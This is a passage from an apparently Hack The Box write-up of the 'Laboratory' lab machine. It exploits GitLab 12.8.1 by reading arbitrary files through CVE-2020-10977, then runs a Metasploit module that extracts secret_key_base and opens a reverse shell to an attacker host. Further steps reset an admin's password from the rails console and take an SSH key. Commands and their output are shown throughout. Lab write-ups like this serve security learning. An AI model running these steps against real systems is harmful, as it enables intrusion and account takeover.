by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            https://laboratory.htb
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:     html,php,txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/02/18 16:12:44 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/images &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/index.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/assets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/CREDITS.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Progress: 38301 / 220561 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;17.37%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;httpsgitlaboratoryhtb&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://git.laboratory.htb&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;As the other DNS entry gave us almost nothing, decided to poke a little with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; subdomain, where we can see an instance of &lt;a href=&quot;https://about.gitlab.com/&quot;&gt;GitLab&lt;/a&gt; Server, as below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/dL6VMKv.png&quot; alt=&quot;gitab laboratory htb&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After some research, found taht API V2 would disclose some information in an unauthenticated way but this enumeration has also resulted in nothing, once the GitLab Server has an API V4 which fixes the issues found.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; https://git.laboratory.htb/api/v3/internal/check &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt;                                               
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;API V3 is no longer supported. Use API V4 instead.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;                                           
                                                                    
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; https://git.laboratory.htb/api/v4/internal/check &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt;                                               
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;401 Unauthorized&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As using the enumeration method, I found also didn’t worked, decided to try creating an account on the instance and had success, besides being mandatory to use an e-mail belonging to an authorized domain (&lt;em&gt;laboratory.htb&lt;/em&gt;) but no confirmation was required.&lt;/p&gt;

&lt;p&gt;Once logged with the newly created account, started browsing the public repositories where I found the &lt;strong&gt;SecureWebSite&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/2FARHEv.png&quot; alt=&quot;gitlab projects&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This repository belongs to the website published to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://laboratory.htb&lt;/code&gt;, where we would be able to get some interesting information if it weren’t a single page application.&lt;/p&gt;

&lt;p&gt;Once we had logon rights now to GitLab, decided to look for the server instance running, where under &lt;em&gt;Help &amp;gt; Help&lt;/em&gt; we could identify version 12.8.1 Community for this implementation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ygc0H7j.png&quot; alt=&quot;gitlab version&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Searching using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; I have found some vulnerabilities that could be explored, identified as &lt;strong&gt;Arbitrary File Read&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit gitlab
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                         |  Path
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
GitLab - &lt;span class=&quot;s1&quot;&gt;'impersonate'&lt;/span&gt; Feature Privilege Escalation                    | ruby/webapps/40236.txt
GitLab 11.4.7 - RCE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                    | ruby/webapps/49334.py
Gitlab 11.4.7 - Remote Code Execution                                  | ruby/webapps/49257.py
GitLab 11.4.7 - Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                  | ruby/webapps/49263.py
GitLab 12.9.0 - Arbitrary File Read                                    | ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                    | ruby/webapps/49076.py
Gitlab 6.0 - Persistent Cross-Site Scripting                           | php/webapps/30329.sh
Gitlab-shell - Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                             | linux/remote/34362.rb
Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting      | java/webapps/47927.txt
NPMJS gitlabhook 0.0.17 - &lt;span class=&quot;s1&quot;&gt;'repository'&lt;/span&gt; Remote Command Execution        | json/webapps/47420.txt
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a few attempts I had no success with the provided scripts. Researching a little more, I came across &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10977&quot;&gt;CVE-2020-10977 in MITRE&lt;/a&gt; which is related to the vulnerability we’re trying to abuse and, after finding it, I found another exploit in GitHub in &lt;a href=&quot;https://github.com/thewhiteh4t/cve-2020-10977&quot;&gt;thewhiteh4t/cve-2020-10977: GitLab 12.9.0 Arbitrary File Read (github.com)&lt;/a&gt; which was later used.&lt;/p&gt;

&lt;p&gt;With this script we were able to confirm that it is vulnerable and be able to read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 ./cve_2020_10977.py https://git.laboratory.htb dummy P@ssw0rd                                   
&lt;span class=&quot;nt&quot;&gt;----------------------------------&lt;/span&gt;                                                                       
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; CVE-2020-10977 &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;       
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; GitLab Arbitrary File Read &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;               
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 12.9.0 &amp;amp; Below &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;    
&lt;span class=&quot;nt&quot;&gt;----------------------------------&lt;/span&gt;                                                                       
                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Found By : vakzz       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; https://hackerone.com/reports/827052 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; PoC By   : thewhiteh4t &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; https://twitter.com/thewhiteh4t      &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Target        : https://git.laboratory.htb                                                           
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Username      : dummy                                                                                
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Password      : P@ssw0rd
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Project Names : ProjectOne, ProjectTwo

&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Trying to Login...         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Login Successful!
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Creating ProjectOne...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] ProjectOne Created Successfully!
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Creating ProjectTwo...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] ProjectTwo Created Successfully!
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Absolute Path to File : /etc/passwd
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Creating an Issue...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Issue Created Successfully!
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Moving Issue...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Issue Moved Successfully!
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File URL : https://git.laboratory.htb/dummy/ProjectTwo/uploads/09bddb24c9ac93d1a011f6ed14054a66/passwd

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Checking the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; we can see that the users of this box, besides &lt;em&gt;root&lt;/em&gt; and &lt;em&gt;ssh&lt;/em&gt; share the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/opt/gitlab&lt;/code&gt; in their home paths, where we’ll look for interesting files.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;etc_passwd | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;sh | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $6&quot;,&quot;$1}'&lt;/span&gt;
/root,root
/var/run/sshd,sshd
/var/opt/gitlab,git
/var/opt/gitlab/postgresql,gitlab-psql
/var/opt/gitlab/mattermost,mattermost
/var/opt/gitlab/registry,registry
/var/opt/gitlab/prometheus,gitlab-prometheus
/var/opt/gitlab/consul,gitlab-consul
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;

&lt;p&gt;Already knowing about a few accounts and the possibility to read files in arbitrarily, I was searching how to convert this LFI to an RCE, to be able to get a reverse shell in this box. After some research I have found &lt;a href=&quot;https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/&quot;&gt;a Metasploit Module&lt;/a&gt; that makes use of this same vulnerability to obtain the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_key_base&lt;/code&gt; from GitLab, and, with a deserialization call in the obtained cookie, obtain a reverse shell as the running account, in this case &lt;strong&gt;git&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/http/gitlab_file_read_rce&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.10.10:4444 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Executing automatic check &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;disable AutoCheck to override&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;to user jdoe
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Created project /jdoe/vWL4JJIQ
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Created project /jdoe/NVfFvw3v
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Created issue /jdoe/vWL4JJIQ/issues/1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Executing arbitrary file load
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File saved as: &lt;span class=&quot;s1&quot;&gt;'/home/zurc/.msf4/loot/20210219090516_default_10.10.10.216_gitlab.secrets_242811.txt'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attempting to delete project /jdoe/vWL4JJIQ
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Deleted project /jdoe/vWL4JJIQ
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attempting to delete project /jdoe/NVfFvw3v
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Deleted project /jdoe/NVfFvw3v
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Command shell session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.10:4444 -&amp;gt; 10.10.10.216:35138&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-19 09:05:22 &lt;span class=&quot;nt&quot;&gt;-0300&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;998&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;git&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;998&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;git&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;998&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;git&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User flag&lt;/h2&gt;

&lt;p&gt;With access to the machine, started enumerating using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; from &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/README.md&quot;&gt;PEAS Suite&lt;/a&gt;. This helped me a lot once I could learn the possibilities while exploiting a GitLab server. The script detects that the service is installed and returned some interesting information about the machine itself:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;GitLab accounts, where &lt;strong&gt;dexter&lt;/strong&gt; (admin@example.com) is an administrator.&lt;/li&gt;
  &lt;li&gt;We are running from a docker container, where we might be required to escape it to exploit the machine itself.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;One of the possibilities listed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; is that we could change the password from any user, which was successfully done for dexter after running the commands below:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@git:~/gitlab-rails&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gitlab-rails console
&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
 GitLab:       12.8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;d18b43a5f5a&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
Loading production environment &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Rails 6.0.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:001:0&amp;gt; user &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; User.find_by&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;email: &lt;span class=&quot;s2&quot;&gt;&quot;admin@example.com&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#&amp;lt;User id:1 @dexter&amp;gt;&lt;/span&gt;
irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:002:0&amp;gt; user.password &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;P@ssw0rd&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;P@ssw0rd&quot;&lt;/span&gt;
irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:003:0&amp;gt; user.password_confirmation &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;P@ssw0rd&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;P@ssw0rd&quot;&lt;/span&gt;
irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:004:0&amp;gt; user.save!
Enqueued ActionMailer::DeliveryJob &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Job ID: 0f18c1b4-9929-47a5-90d7-ec16a7e6f293&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to Sidekiq&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mailers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with arguments: &lt;span class=&quot;s2&quot;&gt;&quot;DeviseMailer&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;password_change&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;deliver_now&quot;&lt;/span&gt;, &lt;span class=&quot;c&quot;&gt;#&amp;lt;GlobalID:0x00007fa424ee0668 @uri=#&amp;lt;URI::GID gid://gitlab/User/1&amp;gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:005:0&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After changed its password, I was able to login with his account and see other repositories in his shoes, where we found a &lt;strong&gt;SecureDocker&lt;/strong&gt; private repo, which called a lot of attention.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/oXJEKFR.png&quot; alt=&quot;gitlab dexter projects&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we have access to the source code, downloaded its contents and found some interesting information used to build the container and a &lt;strong&gt;SSH key&lt;/strong&gt; from dexter under his personal stuff, as mentioned in repo’s description.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CONFIDENTIAL - Secure docker configuration for homeserver. Also some personal stuff, I’ll figure that out later.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After cloning it, we were able to see the following information:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; http.sslVerify&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;clone http://git.laboratory.htb/dexter/securedocker.git  
Cloning into &lt;span class=&quot;s1&quot;&gt;'securedocker'&lt;/span&gt;...
Username &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https://git.laboratory.htb'&lt;/span&gt;: dexter
Password &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https://dexter@git.laboratory.htb'&lt;/span&gt;: 
warning: redirecting to https://git.laboratory.htb/dexter/securedocker.git/
remote: Enumerating objects: 10, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10/10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9/9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
remote: Total 10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 0
Receiving objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10/10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tree &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.git'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
├── create_gitlab.sh
├── dexter
│   ├── recipe.url
│   ├── .ssh
│   │   ├── authorized_keys
│   │   └── id_rsa
│   └── todo.txt
└── README.md

2 directories, 6 files
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Just like we did on &lt;a href=&quot;/en-US/writeup/2021/03/htb-luanne/&quot;&gt;Luanne&lt;/a&gt;, we have converted it to an RSA key using the commands below:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-keygen &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; PEM &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./id_rsa
Key has comment &lt;span class=&quot;s1&quot;&gt;'root@laboratory'&lt;/span&gt;
Enter new passphrase &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;empty &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;no passphrase&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After the mentioned process, I was able to SSH to the machine and get the user flag under Dexter’s account:&lt;/p&gt;

